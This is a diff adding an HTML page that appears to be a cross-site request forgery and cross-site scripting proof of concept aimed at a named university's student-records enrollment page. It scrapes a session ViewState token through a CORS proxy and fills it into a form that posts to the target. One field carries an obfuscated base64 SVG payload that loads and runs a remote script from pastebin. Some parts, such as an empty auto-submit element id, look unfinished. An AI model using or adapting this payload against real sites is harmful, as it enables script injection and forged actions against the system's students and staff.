@@ -1,0 +1,40 @@
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+<style type="text/css">
+	 {
+		display: none;
+	}
+</style>
+<script type="text/javascript">
+	$.get("http://cors-anywhere.herokuapp.com/sga.unifacef.com.br/EddydataApp-war/pages/system/declaracao-matricula.jsf", function(data){
+		aaa = data;
+		var ccc = aaa.substr(4005).slice(0, -1682);
+    	alert(ccc);
+    	var cac = document.getElementById( 'javax.faces.ViewState' );
+    	cac.value = ccc;
+});	    
+
+</script>
+<body onload="document.getElementById('').submit();">
+<form id="j_idt12" name="j_idt12" method="get" action="http://sga.unifacef.com.br/EddydataApp-war/pages/system/declaracao-matricula.jsf" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="j_idt12" value="j_idt12">
+<span id="j_idt12:messages"></span>
+
+			<table style="margin-left: 50%;transform: translateX(-50%);">
+				<tbody><tr>
+					<td><label>
+Código Aluno:</label></td>
+	<input type="text" name="javax.faces.ViewState" id="javax.faces.ViewState" autocomplete="off">
+					<td><input type="text" name="j_idt12:j_idt17" class="inputText" value="<svg onload=document.open();document.write(atob('PHNjcmlwdCBzcmM9Ly9wYXN0ZWJpbi5jb20vcmF3L2c1VjZkZERFPjwvc2NyaXB0Pg=='));document.close();>"></td>
+				</tr>
+				<tr>
+					<td><label>
+Código Validação:</label></td>
+					<td><input type="text" name="j_idt12:j_idt21" value="" class="inputText"></td>
+				</tr>
+				<tr>
+					<td></td>
+					<td><input type="submit" name="j_idt12:j_idt23" value="VALIDAR" style="float:right;" class="button">
+					</td>                    
+				</tr>
+			</tbody></table>
+</form>
